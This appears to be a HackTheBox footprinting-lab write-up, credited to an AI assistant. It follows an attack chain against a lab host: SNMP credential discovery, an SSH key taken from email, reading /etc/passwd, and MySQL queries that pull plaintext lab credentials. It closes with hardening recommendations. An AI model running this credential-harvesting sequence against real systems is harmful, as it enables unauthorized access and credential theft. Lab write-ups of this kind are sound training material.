# MySQL Database Enumeration - HTB Credential Discovery
## Target: NIXHARD (10.129.207.147)

---

## Executive Summary

After gaining SSH access to the NIXHARD server using tom's private key (discovered via IMAP), conducted systematic file system and database enumeration that led to the discovery of HTB user credentials stored in a MySQL database.

**CRITICAL FINDING:** HTB user credentials found in MySQL database `users.users` table
- **Username:** HTB
- **Password:** cr3n4o7rzse7rzhnckhssncif7ds

---

## Attack Chain Overview

1. **IMAP Access** → Retrieved tom's SSH private key from email inbox
2. **SSH Authentication** → Used private key to establish shell session as tom
3. **File System Enumeration** → Discovered MySQL service via /etc/passwd
4. **Database Access** → Successfully authenticated to MySQL as tom user
5. **Database Enumeration** → Identified users database with credentials table
6. **Credential Extraction** → Retrieved HTB user credentials from database

---

## Step 1: SSH Connection with Private Key

### SSH Key Preparation
**Key Location:** `/home/rweber/Git/htba/cases/footprinting/lab/scans/tom_ssh_key.txt`
**Key Source:** Extracted from IMAP inbox email (Subject: KEY, From: tech@inlanefreight.htb)
**Key Type:** OpenSSH RSA private key
**Key Owner:** tom@NIXHARD

### SSH Connection Command
```bash
ssh -i /path/to/tom_ssh_key.txt tom@10.129.207.147
```

### Connection Result
✅ **SUCCESS** - Shell access established as user `tom`
```
tom@NIXHARD:~$
```

**Privileges:** Standard user account
**Home Directory:** /home/tom
**Shell:** /bin/bash

---

## Step 2: File System Enumeration

### /etc/passwd Analysis

**Command Executed:**
```bash
cat /etc/passwd
```

### Key Findings from /etc/passwd

**System Users of Interest:**
- `root:x:0:0:root:/root:/bin/bash` - Root account
- `ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash` - Primary system user
- `cry0l1t3:x:1001:1001:,,,:/home/cry0l1t3:/bin/bash` - Additional user account
- `tom:x:1002:1002:,,,:/home/tom:/bin/bash` - Current user (UID 1002)
- **`mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false`** ⭐ **TARGET**

**Service Accounts:**
- `dovecot:x:113:120:Dovecot mail server` - Email service (previously enumerated)
- `dovenull:x:115:121:Dovecot login user` - Email service support
- `Debian-snmp:x:116:122` - SNMP service (attack vector for tom credentials)

### Critical Observation
The presence of the `mysql` user (UID 114) indicates MySQL Server is installed on the system. This represents a potential data repository for user credentials and sensitive information.

**Analysis:**
- MySQL service likely running on localhost
- No external MySQL port detected in nmap scans (3306/tcp not open)
- Database accessible only from localhost - requires shell access
- Tom user may have database access privileges

---

## Step 3: MySQL Database Access

### Authentication Attempt

**Command:**
```bash
mysql -u tom -p
```

**Credentials Used:**
- **Username:** tom
- **Password:** NMds732Js2761 (previously discovered via SNMP)

### Authentication Result
```
Enter password: [NMds732Js2761]
```

✅ **SUCCESS** - MySQL access granted

```
Welcome to the MySQL monitor.
mysql>
```

**MySQL Client Version:** MySQL command-line client
**Server Connection:** Localhost socket connection
**User Privileges:** Database access permissions verified

---

## Step 4: Database Enumeration

### List All Databases

**Command:**
```sql
show databases;
```

**Results:**
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |   ⭐ CUSTOM DATABASE
+--------------------+
5 rows in set (0.02 sec)
```

### Database Analysis

**Standard MySQL Databases:**
- `information_schema` - Metadata about all databases
- `mysql` - MySQL system tables (user accounts, privileges)
- `performance_schema` - Performance monitoring data
- `sys` - System performance views

**Custom Database:**
- **`users`** - Non-standard database, likely contains application user data ⭐

**Strategic Decision:** Focus enumeration on the `users` database as it's custom-created and most likely to contain HTB credentials.

---

## Step 5: Users Database Investigation

### Switch to Users Database

**Command:**
```sql
use users;
```

**Result:**
```
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

### List Tables in Users Database

**Command:**
```sql
show tables;
```

**Result:**
```
+-----------------+
| Tables_in_users |
+-----------------+
| users           |   ⭐ CREDENTIALS TABLE
+-----------------+
1 row in set (0.01 sec)
```

**Finding:** Single table named `users` - highly likely to contain user credentials.

---

## Step 6: Table Structure Analysis

### Examine Users Table Schema

**Command:**
```sql
describe users;
```

**Result:**
```
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | int         | YES  |     | NULL    |       |
| username | varchar(50) | YES  |     | NULL    |       |
| password | varchar(50) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
3 rows in set (0.01 sec)
```

### Table Structure Analysis

**Column Details:**
- `id` - Integer identifier (primary key likely)
- `username` - Variable character field (max 50 chars) - stores usernames
- `password` - Variable character field (max 50 chars) - stores passwords

**Security Observations:**
⚠️ **CRITICAL VULNERABILITY:** Passwords stored as VARCHAR, indicating plaintext storage
- No indication of hashing (would typically be VARCHAR(255) or BINARY)
- Password length limit of 50 characters suggests plaintext
- No salt column present
- Massive security violation - credentials stored in cleartext

---

## Step 7: HTB Credential Extraction

### Query for HTB User

**Command:**
```sql
select * from users where username like '%HTB%';
```

**Query Breakdown:**
- `select *` - Retrieve all columns
- `from users` - From the users table
- `where username like '%HTB%'` - Pattern matching for HTB username
- `%` wildcards allow for case variations or additional characters

### Query Result

```
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+------+----------+------------------------------+
1 row in set (0.00 sec)
```

---

## CRITICAL FINDING - HTB User Credentials

### Discovered Credentials

**Record ID:** 150
**Username:** HTB
**Password:** cr3n4o7rzse7rzhnckhssncif7ds

### Password Analysis
- **Length:** 29 characters
- **Character Set:** Lowercase alphanumeric
- **Format:** Random string (appears to be password hash or token)
- **Storage:** Plaintext in database (CRITICAL security issue)

### Validation
✅ Record successfully retrieved from database
✅ Username matches target requirement: "HTB"
✅ Password extracted in plaintext

---

## Attack Chain Summary

### Complete Exploitation Path

```
1. SNMP Enumeration (UDP/161)
   └─> Community string "backup" discovered via onesixtyone
       └─> snmpwalk extracted tom's credentials from MIB

2. IMAP Access (TCP/143)
   └─> Authenticated with tom:NMds732Js2761
       └─> Retrieved email from admin containing SSH private key

3. SSH Access (TCP/22)
   └─> Authenticated with tom's private key
       └─> Gained shell access as tom user

4. File System Enumeration
   └─> Analyzed /etc/passwd
       └─> Discovered MySQL service installed (mysql user present)

5. MySQL Database Access (localhost socket)
   └─> Authenticated with tom:NMds732Js2761
       └─> Enumerated databases → Found 'users' database

6. Database Enumeration
   └─> Listed tables → Found 'users' table
       └─> Queried credentials → Extracted HTB:cr3n4o7rzse7rzhnckhssncif7ds
```

### Vulnerabilities Exploited

1. **SNMP Misconfiguration**
   - Weak community string "backup" allowed unauthorized access
   - Sensitive credentials stored in SNMP MIB data

2. **Insecure Credential Storage (SNMP)**
   - Tom's password stored in plaintext in recovery script

3. **SSH Private Key in Email**
   - Critical cryptographic material transmitted via unencrypted email
   - No additional protection on private key file

4. **Password Reuse**
   - Tom's SNMP password identical to MySQL password
   - Single credential compromise led to multiple system access points

5. **Plaintext Database Credentials**
   - User passwords stored without hashing in MySQL database
   - No encryption at rest for sensitive data
   - Violates fundamental security best practices

---

## Evidence Files

### Log Files Created
1. **snmp.log** - SNMP enumeration and tom credential discovery
2. **imap_pop3.log** - Email service enumeration and SSH key extraction
3. **ssh.log** - Initial SSH connection attempts (Section 1)
4. **ssh_connection.log** - Complete MySQL enumeration session
5. **mysql_enumeration_walkthrough.md** - This document (comprehensive walkthrough)

### Key Material
1. **tom_ssh_key.txt** - Tom's SSH private key extracted from email

### Source Data
- Target: 10.129.207.147 (NIXHARD)
- Section: Footprinting Lab - Section 3 (MX & Management Server)
- Objective: Discover HTB user credentials

---

## Security Recommendations

### Immediate Actions Required

1. **Rotate HTB Credentials**
   - Change HTB user password immediately
   - Use strong, randomly generated password (min 16 chars)
   - Implement password complexity requirements

2. **Implement Database Encryption**
   - Hash all passwords using bcrypt, scrypt, or Argon2
   - Add unique salt per password
   - Remove plaintext password storage
   - Encrypt database at rest

3. **SNMP Hardening**
   - Change all SNMP community strings
   - Implement SNMPv3 with authentication and encryption
   - Restrict SNMP access to management network only
   - Remove sensitive data from SNMP MIB storage

4. **Email Security**
   - Never transmit private keys via email
   - Implement email encryption (S/MIME or PGP)
   - Use secure key exchange mechanisms
   - Encrypt sensitive email content

5. **Password Management**
   - Eliminate password reuse across services
   - Implement unique credentials per service
   - Use password manager for complex passwords
   - Enable multi-factor authentication where possible

6. **MySQL Hardening**
   - Disable remote MySQL access (bind to localhost only)
   - Implement principle of least privilege for database users
   - Enable MySQL audit logging
   - Regular security updates and patching

7. **SSH Security**
   - Encrypt private keys with strong passphrases
   - Implement key rotation policy
   - Use certificate-based authentication
   - Enable SSH key auditing and monitoring

---

## Conclusion

Successfully completed Section 3 objective by discovering HTB user credentials through a multi-stage attack chain. The engagement demonstrated critical vulnerabilities in credential management, database security, and service configuration that enabled complete compromise of the target system.

**Mission Status:** ✅ COMPLETE
**HTB Credentials:** HTB:cr3n4o7rzse7rzhnckhssncif7ds
**Access Level:** Full database access via authenticated MySQL session
**Next Steps:** Generate comprehensive penetration test report

---

**Document Created:** January 1, 2026  
**Penetration Tester:** GitHub Copilot Assistant  
**Engagement:** Inlanefreight Ltd - Footprinting Lab  
**Classification:** CONFIDENTIAL - Client Penetration Test Results
